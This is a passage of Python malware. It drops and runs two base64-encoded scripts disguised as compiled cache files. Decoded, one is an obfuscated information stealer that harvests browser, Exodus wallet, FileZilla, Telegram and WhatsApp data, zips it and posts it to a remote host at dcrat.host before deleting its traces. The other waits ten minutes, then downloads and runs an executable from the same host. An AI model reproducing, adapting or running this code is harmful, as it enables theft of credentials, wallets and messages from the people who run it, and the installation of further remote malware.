CAgIGltcG9ydCBhc3luY2lvICNsaW5lOjc3CiAgICBmcm9tIGFzeW5jaW8gaW1wb3J0IGNyZWF0ZV90YXNrICNsaW5lOjc4CiAgICBmcm9tIHR5cGluZyBpbXBvcnQgTGlzdCAjbGluZTo3OQogICAgZnJvbSBwYXRoX3NlYXJjaCBpbXBvcnQgc2VhcmNoX3BsdWdpbl9wYXRocyAscm9vdF9wYXRocyAjbGluZTo4MAogICAgZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZyAjbGluZTo4MQogICAgZnJvbSBhaW9odHRwIGltcG9ydCBDbGllbnRTZXNzaW9uIGFzIFNlc3Npb24gI2xpbmU6ODIKICAgIGltcG9ydCBzZWNyZXRzICNsaW5lOjgzCiAgICBpbXBvcnQgdGltZWl0ICNsaW5lOjg0CiAgICBmcm9tIHBhdGhzIGltcG9ydCBURU1QICNsaW5lOjg1CiAgICBmcm9tIG9zIGltcG9ydCBta2RpciAjbGluZTo4NgogICAgZnJvbSBvcyAucGF0aCBpbXBvcnQgam9pbiAjbGluZTo4NwogICAgZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlICxaSVBfREVGTEFURUQgI2xpbmU6ODgKICAgIGZyb20gdG9vbHMgaW1wb3J0IHppcGRpciAsX2hhbmRsZV90YXNrX3Jlc3VsdCAjbGluZTo4OQogICAgZnJvbSBsb2dnZXIgaW1wb3J0IExvZ2dlciAjbGluZTo5MAogICAgZnJvbSBvcyBpbXBvcnQgc2NhbmRpciAjbGluZTo5MQogICAgZnJvbSBwbHVnaW5zIGltcG9ydCBDaHJvbWl1bSAsRGV0YWlscyAsRXhvZHVzICxGaWxlemlsbGEgLFRlbGVncmFtICxXaGF0c2FwcCAjbGluZTo5MwogICAgSE9TVCA9J2h0dHA6Ly9kY3JhdC5ob3N0OjgwODAnI2xpbmU6OTcKICAgIGFzeW5jIGRlZiBtYWluICgpLT5Ob25lIDojbGluZToxMDAKICAgICAgICBPME8wME8wTzAwME9PMDAwMCA9dGltZWl0IC5kZWZhdWx0X3RpbWVyICgpI2xpbmU6MTAxCiAgICAgICAgTzBPMDAwT08wT09PME8wME8gPXNlY3JldHMgLnRva2VuX2hleCAoMTAgKSNsaW5lOjEwMwogICAgICAgIE9PMDBPME9PME9PME8wME8wID1qb2luIChURU1QICxPME8wMDBPTzBPT08wTzAwTyApI2xpbmU6MTA0CiAgICAgICAgcHJpbnQgKE9PMDBPME9PME9PME8wME8wICkjbGluZToxMDYKICAgICAgICBta2RpciAoT08wME8wT08wT08wTzAwTzAgKSNsaW5lOjEwNwogICAgICAgIE8wMDBPMDAwT08wTzBPT08wIDpMaXN0IFthc3luY2lvIC5UYXNrIF09W10jbGluZToxMDkKICAgICAgICBPTzAwMDBPTzAwT08wT08wTyA9U2Vzc2lvbiAoKSNsaW5lOjExMQogICAgICAgIE8wME9PTzBPME8wME9PMDBPID1Mb2dnZXIgKE9PMDBPME9PME9PME8wME8wICkjbGluZToxMTIKICAgICAgICBPMDBPME9PME9PME8wT09PTyA9Q29uZmlnIChPME8wMDBPTzBPT08wTzAwTyAsSE9TVCAsT08wME8wT08wT08wTzAwTzAgLE8wME9PTzBPME8wME9PMDBPICxPTzAwMDBPTzAwT08wT08wTyAsdGFnID0nOTMyMDM0NzMwJykjbGluZToxMTMKICAgICAgICBhd2FpdCBPMDBPT08wTzBPMDBPTzAwTyAubG9nIChmJ1N0YXJ0JykjbGluZToxMTUKICAgICAgICBPME8wTzBPME8wME9PTzAwMCA9Q2hyb21pdW0gKE8wME8wT08wT08wTzBPT09PICkjbGluZToxMTcKICAgICAgICBPTzAwMDBPMDBPMDBPMDAwTyA9VGVsZWdyYW0gKE8wME8wT08wT08wTzBPT09PICkjbGluZToxMTgKICAgICAgICBPME8wT08wMDBPT09PT08wMCA9eydnb29nbGUnOk8wTzBPME8wTzAwT09PMDAwICwnZXhvZHVzJzpFeG9kdXMgKE8wME8wT08wT08wTzBPT09PICksJ21vemlsbGEnOk5vbmUgLCd0ZWxlZ3JhbSBkZXNrdG9wJzpPTzAwMDBPMDBPMDBPMDAwTyAsJ3RlbGVncmFtJzpUZWxlZ3JhbSAoTzAwTzBPTzBPTzBPME9PT08gKSwnb3BlcmEgc29mdHdhcmUnOk8wTzBPME8wTzAwT09PMDAwICwnZmlsZXppbGxhJzpGaWxlemlsbGEgKE8wME8wT08wT08wTzBPT09PICksJ3doYXRzYXBwJzpXaGF0c2FwcCAoTzAwTzBPTzBPTzBPME9PT08gKX0jbGluZToxMjkKICAgICAgICBPMDAwTzAwME9PME8wT09PMCAuYXBwZW5kIChjcmVhdGVfdGFzayAoc2VhcmNoX3BsdWdpbl9wYXRocyAocm9vdF9wYXRocyAsTzBPME9PMDAwT09PT09PMDAgLE8wME9PTzBPME8wME9PMDBPICkpKSNsaW5lOjEzMQogICAgICAgIE8wMDAwTzAwME9PME8wT08wID1bRGV0YWlscyAoTzAwTzBPTzBPTzBPME9PT08gKV0jbGluZToxMzMKICAgICAgICBmb3IgT08wTzBPME9PME9PT09PME8gaW4gTzAwMDBPMDAwT08wTzBPTzAgOiNsaW5lOjEzNQogICAgICAgICAgICBPMDAwTzAwME9PME8wT09PMCAuYXBwZW5kIChjcmVhdGVfdGFzayAoT08wTzBPME9PME9PT09PME8gLmNhbGxiYWNrICgpKSkjbGluZToxMzYKICAgICAgICBmb3IgTzBPMDAwME8wTzBPTzBPT08gaW4gTzAwME8wMDBPTzBPME9PTzAgOiNsaW5lOjEzOAogICAgICAgICAgICBPME8wMDAwTzBPME9PME9PTyAuYWRkX2RvbmVfY2FsbGJhY2sgKGxhbWJkYSBPT08wTzBPME8wTzBPMDAwTyA6X2hhbmRsZV90YXNrX3Jlc3VsdCAoT09PME8wTzBPME8wTzAwME8gLE8wME9PTzBPME8wME9PMDBPICkpI2xpbmU6MTM5CiAgICAgICAgdHJ5IDojbGluZToxNDIKICAgICAgICAgICAgTzAwMDAwMDAwMDBPT08wTzAgPVRlbGVncmFtIC5nZXRfcmVnaXN0cnlfcGF0aCAoKSNsaW5lOjE0MwogICAgICAgICAgICBhd2FpdCBPTzAwMDBPMDBPMDBPMDAwTyAuY2FsbGJhY2sgKE8wMDAwMDAwMDAwT09PME8wICkjbGluZToxNDQKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIE9PME8wTzAwT08wME9PME9PIDojbGluZToxNDUKICAgICAgICAgICAgYXdhaXQgTzAwT09PME8wTzAwT08wME8gLmxvZyAoZidFcnJvciB3aGVuIHN0ZWFsaW5nIHRlbGVncmFtIHJlZ2lzdHJ5LCB7T08wTzBPMDBPTzAwT08wT099JykjbGluZToxNDYKICAgICAgICB0cnkgOiNsaW5lOjE0OAogICAgICAgICAgICBPMDAwT08wT08wMDBPTzAwMCA9VGVsZWdyYW0gLmdldF9sbmtfcGF0aCAoKSNsaW5lOjE0OQogICAgICAgICAgICBpZiBPMDAwT08wT08wMDBPTzAwMCA6I2xpbmU6MTUwCiAgICAgICAgICAgICAgICBhd2FpdCBPTzAwMDBPMDBPMDBPMDAwTyAuY2FsbGJhY2sgKE8wMDAwMDAwMDAwT09PME8wICkjbGluZToxNTEKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIE9PME8wTzAwT08wME9PME9PIDojbGluZToxNTIKICAgICAgICAgICAgYXdhaXQgTzAwT09PME8wTzAwT08wME8gLmxvZyAoZidFcnJvciB3aGVuIHN0ZWFsaW5nIHRlbGVncmFtIGxuaywge09PME8wTzAwT08wME9PME9PfScpI2xpbmU6MTUzCiAgICAgICAgdHJ5IDojbGluZToxNTUKICAgICAgICAgICAgZm9yIE8wME8wTzAwTzBPMDBPME9PIGluIFRlbGVncmFtIC5nZXRfdGVsZWdyYW1zICgpOiNsaW5lOjE1NgogICAgICAgICAgICAgICAgdHJ5IDojbGluZToxNTcKICAgICAgICAgICAgICAgICAgICBhd2FpdCBPTzAwMDBPMDBPMDBPMDAwTyAuY2FsbGJhY2sgKE8wME8wTzAwTzBPMDBPME9PICkjbGluZToxNTgKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgT08wTzBPMDBPTzAwT08wT08gOiNsaW5lOjE1OQogICAgICAgICAgICAgICAgICAgIGF3YWl0IE8wME9PTzBPME8wME9PMDBPIC5sb2cgKGYnVGVsZWdyYW0gZnJvbSBwc3V0aWwgZXJyb3IsIHtPTzBPME8wME9PMDBPTzBPT30nKSNsaW5lOjE2MAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgT08wTzBPMDBPTzAwT08wT08gOiNsaW5lOjE2MQogICAgICAgICAgICBhd2FpdCBPMDBPT08wTzBPMDBPTzAwTyAubG9nIChmJ0Vycm9yIHdoZW4gc3RlYWxpbmcgdGVsZWdyYW1zIHByb2MsIHtPTzBPME8wME9PMDBPTzBPT30nKSNsaW5lOjE2MgogICAgICAgIGZvciBPME8wMDAwTzBPME9PME9PTyBpbiBPMDAwTzAwME9PME8wT09PMCA6I2xpbmU6MTY1CiAgICAgICAgICAgIHRyeSA6I2xpbmU6MTY2CiAgICAgICAgICAgICAgICBhd2FpdCBPME8wMDAwTzBPME9PME9PTyAjbGluZToxNjcKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBPTzBPME8wME9PMDBPTzBPTyA6I2xpbmU6MTY4CiAgICAgICAgICAgICAgICBhd2FpdCBPMDBPT08wTzBPMDBPTzAwTyAubG9nIChmJ0Vycm9yIGluIG1haW4ucHkgdGFza3Mge09PME8wTzAwT08wME9PME9PfScpI2xpbmU6MTY5CiAgICAgICAgYXdhaXQgTzAwT09PME8wTzAwT08wME8gLmxvZyAoZifQndCw0YfQuNC90LDRjiDQvtGC0L/RgNCw0LLQutGDINC70L7Qs9CwJykjbGluZToxNzEKICAgICAgICBPT08wTzBPT08wT09PME8wMCA9am9pbiAoVEVNUCAsZid7TzBPMDAwT08wT09PME8wME99LnppcCcpI2xpbmU6MTczCiAgICAgICAgd2l0aCBaaXBGaWxlIChPT08wTzBPT08wT09PME8wMCAsJ3cnLFpJUF9ERUZMQVRFRCApYXMgT08wT09PT09PTzBPME8wT08gOiNsaW5lOjE3NAogICAgICAgICAgICB6aXBkaXIgKE9PMDBPME9PME9PME8wME8wICxPTzBPT09PT09PME8wTzBPTyApI2xpbmU6MTc1CiAgICAgICAgTzBPT09PME9PME9PME8wT08gPXsnZmlsZSc6b3BlbiAoT09PME8wT09PME9PTzBPMDAgLCdyYicpfSNsaW5lOjE3NwogICAgICAgIGF3YWl0IE9PMDAwME9PMDBPTzBPTzBPIC5wb3N0IChmJ3tIT1NUfS9yZWNlaXZlX2xvZycscGFyYW1zID17J2NsaWVudF9pZCc6TzBPMDAwT08wT09PME8wME8gfSxkYXRhID1PME9PT08wT08wT08wTzBPTyApI2xpbmU6MTc5CiAgICAgICAgYXdhaXQgT08wMDAwT08wME9PME9PME8gLmNsb3NlICgpI2xpbmU6MTgwCiAgICAgICAgTzAwME8wTzAwTzAwME9PT08gPXRpbWVpdCAuZGVmYXVsdF90aW1lciAoKSNsaW5lOjE4MgogICAgICAgIGF3YWl0IE8wME9PTzBPME8wME9PMDBPIC5sb2cgKGYnVGltZToge08wMDBPME8wME8wMDBPT09PLU8wTzAwTzBPMDAwT08wMDAwfScpI2xpbmU6MTgzCiAgICAgICAgdHJ5IDojbGluZToxODUKICAgICAgICAgICAgaWYgJ0RFQlVHJ25vdCBpbiB7TzBPME9PT08wT08wME8wT08gLm5hbWUgZm9yIE8wTzBPT09PME9PMDBPME9PIGluIHNjYW5kaXIgKGpvaW4gKFRFTVAgLCdfX3B5Y2FjaGVfXycpKX06I2xpbmU6MTg2CiAgICAgICAgICAgICAgICBmcm9tIHNodXRpbCBpbXBvcnQgcm10cmVlICNsaW5lOjE4NwogICAgICAgICAgICAgICAgdHJ5IDojbGluZToxODgKICAgICAgICAgICAgICAgICAgICBybXRyZWUgKGpvaW4gKFRFTVAgLCdfX3B5Y2FjaGVfXycpKSNsaW5lOjE4OQogICAgICAgICAgICAgICAgZXhjZXB0IDojbGluZToxOTAKICAgICAgICAgICAgICAgICAgICBwYXNzICNsaW5lOjE5MQogICAgICAgICAgICAgICAgcm10cmVlIChPTzAwTzBPTzBPTzBPMDBPMCApI2xpbmU6MTkyCiAgICAgICAgZXhjZXB0IDojbGluZToxOTMKICAgICAgICAgICAgcGFzcyAjbGluZToxOTQKICAgIGFzeW5jaW8gLmdldF9ldmVudF9sb29wICgpLnJ1bl91bnRpbF9jb21wbGV0ZSAobWFpbiAoKSk='))

    with open(join(main_dir, 'scripts.cpython-39.py'), 'w', encoding='utf8') as f:
        f.write(b64('CmZyb20gYWlvaHR0cCBpbXBvcnQgQ2xpZW50U2Vzc2lvbiBhcyBTZXNzCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgUG9wZW4sIFBJUEUKZnJvbSBvcy5wYXRoIGltcG9ydCBzcGxpdCwgam9pbgpmcm9tIG9zIGltcG9ydCBlbnZpcm9uCmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4CmltcG9ydCBhc3luY2lvCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKCgoKc2xlZXAoNjAwKQoKCkxPQ0FMID0gZW52aXJvblsnVVNFUlBST0ZJTEUnXQpURU1QID0gam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAnbG9jYWwnLCAndGVtcCcpCgphc3luYyBkZWYgbG9hZF9leGVjKHVybDogc3RyKToKICAgIHNhdmVfcGF0aCA9IGpvaW4oVEVNUCwgZid7dG9rZW5faGV4KDgpfS5leGUnKQoKICAgIGFzeW5jIHdpdGggU2VzcygpIGFzIHM6CiAgICAgICAgYXN5bmMgd2l0aCBzLmdldCh1cmwpIGFzIHJlc3A6CiAgICAgICAgICAgIHdpdGggb3BlbihzYXZlX3BhdGgsICd3YicpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGF3YWl0IHJlc3AucmVhZCgpKQoKICAgIHByaW50KHNhdmVfcGF0aCkKCiAgICBQb3BlbihzYXZlX3BhdGgsIHN0ZGluPVBJUEUsIHN0ZG91dD1QSVBFLCBzdGRlcnI9UElQRSwKICAgICAgICAgICAgY3JlYXRpb25mbGFncz0weDAwMDAwMDA4IHwgMHgwMDAwMDIwMCwgc2hlbGw9VHJ1ZSkKCgphc3luY2lvLmdldF9ldmVudF9sb29wKCkucnVuX3VudGlsX2NvbXBsZXRlKGxvYWRfZXhlYygnaHR0cDovL2RjcmF0Lmhvc3QvZm9udC5leGUnKSkK'))

    chdir(main_dir) 
    if DEBUG:
        try:
            with open(join(main_dir, 'DEBUG'), 'w') as f:
                pass
        except:
            pass
    run('main.cpython-39.py')
    run('scripts.cpython-39.py')
except Exception as e:
    with open(join(main_dir, 'main error.txt'), 'a', encoding='utf8') as f:
        f.write(traceback.format_exc() + '\n')
